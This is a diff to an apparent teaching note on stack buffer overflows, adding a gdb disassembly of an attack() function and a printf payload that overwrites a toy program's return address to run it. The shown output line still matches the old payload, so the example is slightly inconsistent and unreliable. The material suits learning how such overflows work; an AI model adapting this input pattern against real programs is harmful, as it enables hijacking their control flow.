@@ -123,12 +123,19 @@ attacker's code is executed!!
 2. Use an input string to overwrite the return address
 ----------------------------------------------------------------
 
-Note: Using gdb, we can find out the address of the attack()
-      function:
-      => 0x0000000000400567
+Note: Using gdb, we can find out the address of the attack() 
+function:
+(gdb) disass attack
+   Dump of assembler code for function attack:
+   0x0000555555555155 <+0>:     push   rbp
+   0x0000555555555156 <+1>:     mov    rbp,rsp
+   0x0000555555555159 <+4>:     lea    rdi,[rip+0xea4]        # 0x555555556004
+   0x0000555555555160 <+11>:    call   0x555555555030 <puts@plt>
+   0x0000555555555165 <+16>:    mov    edi,0x0
+   0x000055555555516a <+21>:    call   0x555555555050 <exit@plt>
 
-$ printf "AAAAAAAAAAAAAAAA\x67\x05\x40\x00\x00\x00\x00\x00" | ./overwrite_return_addr
+   => 0x 00 00 55 55 55 55 51 55
+
+$ printf "AAAAAAAAAAAAAAAA\x55\x51\x55\x55\x55\x55\x00\x00" | ./overwrite_return_addr
 AAAAAAAAAAAAAAAAg@
 attacker's code is executed!!
-
-
